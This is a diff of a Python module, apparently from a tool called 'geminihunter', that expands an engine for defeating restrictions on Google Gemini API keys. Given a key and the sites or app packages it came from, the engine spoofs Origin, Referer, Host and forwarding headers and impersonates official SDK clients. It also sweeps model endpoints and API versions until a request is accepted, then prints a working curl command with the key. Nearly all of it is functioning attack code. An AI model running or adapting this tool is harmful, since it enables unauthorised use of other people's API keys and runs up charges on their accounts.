@@ -6,10 +6,12 @@ import logging
 from abc import ABC, abstractmethod
 from dataclasses import dataclass, field
 from typing import ClassVar
+from urllib.parse import urlparse
 
 import httpx
 
 from geminihunter.models import BypassDetail
+from geminihunter.network.session import SessionManager
 
 logger = logging.getLogger("geminihunter")
 
@@ -501,7 +503,96 @@ class SdkUserAgent(BypassStrategy):
 # --- Bypass engine ---
 
 
-BYPASS_TIMEOUT = 5.0  # Shorter timeout for bypass attempts
+BYPASS_TIMEOUT = 1.5
+TOTAL_BYPASS_BUDGET = 4.0
+GOOGLE_WEB_ORIGINS = [
+    "https://aistudio.google.com",
+    "https://console.cloud.google.com",
+    "https://ai.google.dev",
+    "https://makersuite.google.com",
+    "https://www.google.com",
+]
+PRIORITY_MODELS = [
+    "gemini-2.0-flash",
+    "gemini-2.0-flash-lite",
+    "gemini-1.5-flash",
+    "gemini-1.5-pro",
+]
+SDK_CLIENT_HEADERS = [
+    {"X-Goog-Api-Client": "genai-js/0.21.0"},
+    {"X-Goog-Api-Client": "gl-python/3.12.0 grpc/1.62.0 gax/2.24.0"},
+    {"X-Goog-Api-Client": "genai-go/0.7.0"},
+]
+SDK_USER_AGENTS = [
+    {"User-Agent": "google-api-python-client/2.149.0 (gzip)"},
+    {"User-Agent": "gl-python/3.12 google-cloud-sdk/0.1"},
+    {"User-Agent": "google-api-nodejs-client/9.14.0"},
+]
+
+
+def _is_http_url(value: str) -> bool:
+    return value.startswith(("http://", "https://"))
+
+
+def _registrable_domain(host: str) -> str:
+    parts = host.split(".")
+    if len(parts) >= 3 and parts[-2] in {"co", "com", "org", "net", "gov", "ac", "edu"}:
+        return ".".join(parts[-3:])
+    if len(parts) >= 2:
+        return ".".join(parts[-2:])
+    return host
+
+
+def _dedupe_keep_order(values: list[str]) -> list[str]:
+    seen: set[str] = set()
+    out: list[str] = []
+    for value in values:
+        if value and value not in seen:
+            seen.add(value)
+            out.append(value)
+    return out
+
+
+def _build_browser_headers(
+    origin: str | None = None,
+    referer: str | None = None,
+    host_override: str | None = None,
+    extra: dict[str, str] | None = None,
+) -> dict[str, str]:
+    headers = {
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Sec-Fetch-Dest": "empty",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Site": "cross-site",
+    }
+    if origin:
+        headers["Origin"] = origin
+    if referer:
+        headers["Referer"] = referer
+        if origin and referer.startswith(origin):
+            headers["Sec-Fetch-Site"] = "same-origin"
+    if host_override:
+        headers["Host"] = host_override
+        headers["X-Forwarded-Host"] = host_override
+        headers["X-Forwarded-Proto"] = "https"
+        headers["Forwarded"] = f"host={host_override};proto=https"
+    if extra:
+        headers.update(extra)
+    return headers
+
+
+def _content_body(text: str = "hi") -> str:
+    return json.dumps({"contents": [{"parts": [{"text": text}]}]})
+
+
+def _embed_body() -> str:
+    return json.dumps(
+        {
+            "model": "models/embedding-001",
+            "content": {"parts": [{"text": "test"}]},
+        }
+    )
 
 
 class BypassEngine:
@@ -513,29 +604,374 @@ class BypassEngine:
         else:
             self.strategies = strategies
 
-    def generate_all_attempts(
-        self, key: str, target_domain: str
+    def _candidate_domains(
+        self,
+        target_domain: str,
+        target_domains: list[str] | None,
+        source_urls: list[str] | None,
+    ) -> list[str]:
+        domains: list[str] = []
+        for domain in (target_domains or []) + [target_domain]:
+            if domain and domain not in {"direct", "apk"}:
+                domains.append(domain)
+        for url in source_urls or []:
+            if not _is_http_url(url):
+                continue
+            host = urlparse(url).hostname
+            if host:
+                domains.extend([host, _registrable_domain(host)])
+        expanded: list[str] = []
+        for domain in _dedupe_keep_order(domains):
+            expanded.append(domain)
+            root = _registrable_domain(domain)
+            for prefix in ("app", "api", "www", "m"):
+                candidate = f"{prefix}.{root}"
+                if candidate != domain:
+                    expanded.append(candidate)
+        return _dedupe_keep_order(expanded)[:12]
+
+    def _candidate_contexts(
+        self,
+        domains: list[str],
+        source_urls: list[str] | None,
+    ) -> tuple[list[str], list[str]]:
+        origins: list[str] = []
+        referers: list[str] = []
+
+        for url in source_urls or []:
+            if not _is_http_url(url):
+                continue
+            parsed = urlparse(url)
+            if not parsed.hostname:
+                continue
+            origin = f"{parsed.scheme}://{parsed.netloc}"
+            origins.append(origin)
+            referers.append(url)
+            referers.append(f"{origin}/")
+
+        for domain in domains:
+            origins.append(f"https://{domain}")
+            referers.append(f"https://{domain}/")
+
+        origins.extend(GOOGLE_WEB_ORIGINS)
+        referers.extend(f"{origin}/" for origin in GOOGLE_WEB_ORIGINS)
+        return _dedupe_keep_order(origins)[:12], _dedupe_keep_order(referers)[:16]
+
+    def _attempt(
+        self,
+        technique_name: str,
+        headers: dict[str, str] | None = None,
+        api_version: str = "v1beta",
+        endpoint: str = "models",
+        method: str = "GET",
+        body: str | None = None,
+        key_in_header: bool = False,
+    ) -> BypassAttempt:
+        return BypassAttempt(
+            technique_name=technique_name,
+            headers=headers or {},
+            api_version=api_version,
+            endpoint=endpoint,
+            method=method,
+            body=body,
+            key_in_header=key_in_header,
+        )
+
+    def _dedupe_attempts(self, attempts: list[BypassAttempt]) -> list[BypassAttempt]:
+        seen: set[tuple] = set()
+        unique: list[BypassAttempt] = []
+        for attempt in attempts:
+            fingerprint = (
+                attempt.method,
+                attempt.api_version,
+                attempt.endpoint,
+                attempt.body or "",
+                attempt.key_in_header,
+                tuple(sorted(attempt.headers.items())),
+            )
+            if fingerprint not in seen:
+                seen.add(fingerprint)
+                unique.append(attempt)
+        return unique
+
+    def _classification_probes(
+        self,
+        domains: list[str],
+        origins: list[str],
+        referers: list[str],
+    ) -> list[BypassAttempt]:
+        origin = origins[0] if origins else None
+        referer = referers[0] if referers else None
+        domain = domains[0] if domains else None
+        probes = [
+            self._attempt(
+                "probe:browser-ref-models",
+                headers=_build_browser_headers(origin, referer),
+            ),
+            self._attempt(
+                "probe:header-browser-models",
+                headers=_build_browser_headers(origin, referer),
+                key_in_header=True,
+            ),
+            self._attempt(
+                "probe:query-generate",
+                headers={"Content-Type": "application/json"},
+                endpoint=f"models/{PRIORITY_MODELS[0]}:generateContent",
+                method="POST",
+                body=_content_body(),
+            ),
+            self._attempt(
+                "probe:query-browser-generate",
+                headers=_build_browser_headers(
+                    origin,
+                    referer,
+                    domain,
+                    extra={"Content-Type": "application/json"},
+                ),
+                endpoint=f"models/{PRIORITY_MODELS[0]}:generateContent",
+                method="POST",
+                body=_content_body(),
+            ),
+        ]
+        return self._dedupe_attempts(probes)
+
+    def _contextual_referrer_attempts(
+        self,
+        domains: list[str],
+        origins: list[str],
+        referers: list[str],
+        key_in_header: bool,
     ) -> list[BypassAttempt]:
         attempts: list[BypassAttempt] = []
-        for strategy in self.strategies:
-            attempts.extend(strategy.generate_attempts(key, target_domain))
-        return attempts
+        for origin, referer in zip(origins[:8], referers[:8]):
+            attempts.append(
+                self._attempt(
+                    f"browser:models:{referer}",
+                    headers=_build_browser_headers(origin, referer),
+                    key_in_header=key_in_header,
+                )
+            )
+            for model in PRIORITY_MODELS[:2]:
+                attempts.append(
+                    self._attempt(
+                        f"browser:generate:{model}:{referer}",
+                        headers=_build_browser_headers(
+                            origin,
+                            referer,
+                            extra={"Content-Type": "application/json"},
+                        ),
+                        endpoint=f"models/{model}:generateContent",
+                        method="POST",
+                        body=_content_body(),
+                        key_in_header=key_in_header,
+                    )
+                )
+                attempts.append(
+                    self._attempt(
+                        f"browser:count:{model}:{referer}",
+                        headers=_build_browser_headers(
+                            origin,
+                            referer,
+                            extra={"Content-Type": "application/json"},
+                        ),
+                        endpoint=f"models/{model}:countTokens",
+                        method="POST",
+                        body=_content_body("tokenize"),
+                        key_in_header=key_in_header,
+                    )
+                )
+        for domain in domains[:6]:
+            origin = f"https://{domain}"
+            referer = f"{origin}/"
+            attempts.append(
+                self._attempt(
+                    f"origin-only:{domain}",
+                    headers=_build_browser_headers(origin, referer),
+                    key_in_header=key_in_header,
+                )
+            )
+        return self._dedupe_attempts(attempts)
 
-    async def run(
+    def _host_override_attempts(
+        self,
+        domains: list[str],
+        origins: list[str],
+        referers: list[str],
+        key_in_header: bool,
+    ) -> list[BypassAttempt]:
+        attempts: list[BypassAttempt] = []
+        origin = origins[0] if origins else None
+        referer = referers[0] if referers else None
+        for domain in domains[:6]:
+            attempts.append(
+                self._attempt(
+                    f"host-override:{domain}",
+                    headers=_build_browser_headers(origin, referer, host_override=domain),
+                    key_in_header=key_in_header,
+                )
+            )
+            attempts.append(
+                self._attempt(
+                    f"host-override-generate:{domain}",
+                    headers=_build_browser_headers(
+                        origin,
+                        referer,
+                        host_override=domain,
+                        extra={"Content-Type": "application/json"},
+                    ),
+                    endpoint=f"models/{PRIORITY_MODELS[0]}:generateContent",
+                    method="POST",
+                    body=_content_body(),
+                    key_in_header=key_in_header,
+                )
+            )
+        return self._dedupe_attempts(attempts)
+
+    def _sdk_attempts(
+        self,
+        origins: list[str],
+        referers: list[str],
+        key_in_header: bool,
+    ) -> list[BypassAttempt]:
+        attempts: list[BypassAttempt] = []
+        origin = origins[0] if origins else None
+        referer = referers[0] if referers else None
+        for extra in SDK_CLIENT_HEADERS + SDK_USER_AGENTS:
+            attempts.append(
+                self._attempt(
+                    f"sdk:models:{next(iter(extra.values()))}",
+                    headers=_build_browser_headers(origin, referer, extra=extra),
+                    key_in_header=key_in_header,
+                )
+            )
+            attempts.append(
+                self._attempt(
+                    f"sdk:generate:{next(iter(extra.values()))}",
+                    headers=_build_browser_headers(
+                        origin,
+                        referer,
+                        extra={**extra, "Content-Type": "application/json"},
+                    ),
+                    endpoint=f"models/{PRIORITY_MODELS[0]}:generateContent",
+                    method="POST",
+                    body=_content_body(),
+                    key_in_header=key_in_header,
+                )
+            )
+        return self._dedupe_attempts(attempts)
+
+    def _endpoint_matrix_attempts(self, key_in_header: bool) -> list[BypassAttempt]:
+        attempts: list[BypassAttempt] = []
+        for api_version in ("v1beta", "v1"):
+            attempts.append(
+                self._attempt(
+                    f"endpoint:models:{api_version}",
+                    api_version=api_version,
+                    key_in_header=key_in_header,
+                )
+            )
+            for model in PRIORITY_MODELS:
+                attempts.append(
+                    self._attempt(
+                        f"endpoint:generate:{api_version}:{model}",
+                        headers={"Content-Type": "application/json"},
+                        api_version=api_version,
+                        endpoint=f"models/{model}:generateContent",
+                        method="POST",
+                        body=_content_body(),
+                        key_in_header=key_in_header,
+                    )
+                )
+                attempts.append(
+                    self._attempt(
+                        f"endpoint:count:{api_version}:{model}",
+                        headers={"Content-Type": "application/json"},
+                        api_version=api_version,
+                        endpoint=f"models/{model}:countTokens",
+                        method="POST",
+                        body=_content_body("tokenize"),
+                        key_in_header=key_in_header,
+                    )
+                )
+            attempts.append(
+                self._attempt(
+                    f"endpoint:stream:{api_version}",
+                    headers={"Content-Type": "application/json"},
+                    api_version=api_version,
+                    endpoint=f"models/{PRIORITY_MODELS[0]}:streamGenerateContent",
+                    method="POST",
+                    body=_content_body(),
+                    key_in_header=key_in_header,
+                )
+            )
+            attempts.append(
+                self._attempt(
+                    f"endpoint:embed:{api_version}",
+                    headers={"Content-Type": "application/json"},
+                    api_version=api_version,
+                    endpoint="models/embedding-001:embedContent",
+                    method="POST",
+                    body=_embed_body(),
+                    key_in_header=key_in_header,
+                )
+            )
+        return self._dedupe_attempts(attempts)
+
+    def _planned_batches(
+        self,
+        domains: list[str],
+        origins: list[str],
+        referers: list[str],
+        probe_statuses: dict[str, int],
+    ) -> list[list[BypassAttempt]]:
+        likely_referrer = probe_statuses.get("probe:browser-ref-models") in (200, 429)
+        header_bias = probe_statuses.get("probe:header-browser-models") in (200, 429)
+        endpoint_bias = any(
+            probe_statuses.get(name) in (200, 429)
+            for name in ("probe:query-generate", "probe:query-browser-generate")
+        )
+
+        auth_modes = [header_bias] if likely_referrer or header_bias else [False, True]
+        batches: list[list[BypassAttempt]] = []
+
+        for idx, prefer_header in enumerate(auth_modes):
+            key_in_header = prefer_header
+            batches.append(
+                self._contextual_referrer_attempts(
+                    domains,
+                    origins[:6] if likely_referrer else origins[:4],
+                    referers if likely_referrer or idx == 0 else referers[:4],
+                    key_in_header,
+                )
+            )
+            if likely_referrer:
+                batches.append(
+                    self._host_override_attempts(
+                        domains[:4], origins[:4], referers[:4], key_in_header
+                    )
+                )
+            if header_bias or prefer_header:
+                batches.append(self._sdk_attempts(origins[:3], referers[:3], key_in_header))
+            if endpoint_bias or not likely_referrer:
+                batches.append(self._endpoint_matrix_attempts(key_in_header))
+
+        return [self._dedupe_attempts(batch) for batch in batches if batch]
+
+    async def _run_attempt_batch(
         self,
         key: str,
-        target_domain: str,
+        attempts: list[BypassAttempt],
         client: httpx.AsyncClient,
-        concurrency: int = 10,
-    ) -> BypassDetail | None:
-        """
-        Execute all bypass attempts concurrently.
-        Returns immediately on first success, cancelling remaining tasks.
-        """
-        attempts = self.generate_all_attempts(key, target_domain)
+        session: SessionManager,
+        concurrency: int,
+        time_budget: float,
+    ) -> tuple[BypassDetail | None, dict[str, int]]:
+        if time_budget <= 0:
+            return None, {}
         sem = asyncio.Semaphore(concurrency)
         found: asyncio.Event = asyncio.Event()
-        winner: list[tuple[BypassAttempt, int]] = []  # (attempt, status_code)
+        winner: list[tuple[BypassAttempt, int]] = []
+        statuses: dict[str, int] = {}
 
         async def try_attempt(attempt: BypassAttempt) -> None:
             if found.is_set():
@@ -545,49 +981,108 @@ class BypassEngine:
                     return
                 try:
                     url = attempt.to_url(key)
-                    kwargs: dict = {"headers": dict(attempt.headers)}
-                    if attempt.body:
-                        kwargs["content"] = attempt.body
-
-                    resp = await client.request(
-                        attempt.method, url, timeout=BYPASS_TIMEOUT, **kwargs
+                    headers = dict(attempt.headers)
+                    if attempt.key_in_header:
+                        headers["x-goog-api-key"] = key
+                    resp = await session.fetch(
+                        client,
+                        url,
+                        method=attempt.method,
+                        headers=headers,
+                        data=attempt.body,
+                        timeout=BYPASS_TIMEOUT,
+                        max_retries=1,
+                        retry_on_429=False,
                     )
-
-                    # 200 = direct success, 429 = key accepted but rate-limited
-                    # Both confirm the bypass works (original was 403)
+                    if resp is None:
+                        return
+                    statuses[attempt.technique_name] = resp.status_code
                     if resp.status_code in (200, 429):
                         winner.append((attempt, resp.status_code))
                         found.set()
-
                 except (httpx.HTTPError, Exception):
                     pass
 
         tasks = [asyncio.create_task(try_attempt(a)) for a in attempts]
-        # found_waiter resolves on first bypass success;
-        # all_done resolves when every attempt finishes (no bypass found).
-        # We exit on whichever comes first (or timeout).
         found_waiter = asyncio.create_task(found.wait())
-        all_done = asyncio.ensure_future(
-            asyncio.gather(*tasks, return_exceptions=True)
-        )
+        all_done = asyncio.ensure_future(asyncio.gather(*tasks, return_exceptions=True))
         try:
             await asyncio.wait(
                 {found_waiter, all_done},
-                timeout=BYPASS_TIMEOUT + 2,
+                timeout=min(BYPASS_TIMEOUT + 0.5, time_budget),
                 return_when=asyncio.FIRST_COMPLETED,
             )
         finally:
             found_waiter.cancel()
-            for t in tasks:
-                if not t.done():
-                    t.cancel()
+            for task in tasks:
+                if not task.done():
+                    task.cancel()
             await asyncio.gather(*tasks, return_exceptions=True)
 
         if winner:
             attempt, status_code = winner[0]
             detail = attempt.to_bypass_detail()
-            detail.curl_command = attempt.to_curl(key)
+            rendered = BypassAttempt(
+                technique_name=attempt.technique_name,
+                headers={
+                    **{k: v for k, v in attempt.headers.items() if k.lower() != "x-goog-api-key"},
+                    **({"x-goog-api-key": key} if attempt.key_in_header else {}),
+                },
+                api_version=attempt.api_version,
+                endpoint=attempt.endpoint,
+                method=attempt.method,
+                body=attempt.body,
+                key_in_header=attempt.key_in_header,
+            )
+            detail.headers = rendered.headers
+            detail.curl_command = rendered.to_curl(key)
             detail.bypass_status_code = status_code
-            return detail
+            return detail, statuses
 
+        return None, statuses
+
+    async def run(
+        self,
+        key: str,
+        target_domain: str,
+        client: httpx.AsyncClient,
+        session: SessionManager,
+        source_urls: list[str] | None = None,
+        target_domains: list[str] | None = None,
+        concurrency: int = 10,
+    ) -> BypassDetail | None:
+        """Run probe-based, deduplicated bypass batches and stop on first success."""
+        domains = self._candidate_domains(target_domain, target_domains, source_urls)
+        origins, referers = self._candidate_contexts(domains, source_urls)
+        started = asyncio.get_running_loop().time()
+
+        def remaining_budget() -> float:
+            elapsed = asyncio.get_running_loop().time() - started
+            return max(0.0, TOTAL_BYPASS_BUDGET - elapsed)
+
+        probe_winner, probe_statuses = await self._run_attempt_batch(
+            key,
+            self._classification_probes(domains, origins, referers),
+            client,
+            session,
+            concurrency=min(concurrency, 4),
+            time_budget=min(remaining_budget(), 1.8),
+        )
+        if probe_winner:
+            return probe_winner
+
+        for batch in self._planned_batches(domains, origins, referers, probe_statuses):
+            budget = remaining_budget()
+            if budget <= 0:
+                break
+            winner, _ = await self._run_attempt_batch(
+                key,
+                batch,
+                client,
+                session,
+                concurrency=min(concurrency, 6),
+                time_budget=budget,
+            )
+            if winner:
+                return winner
         return None
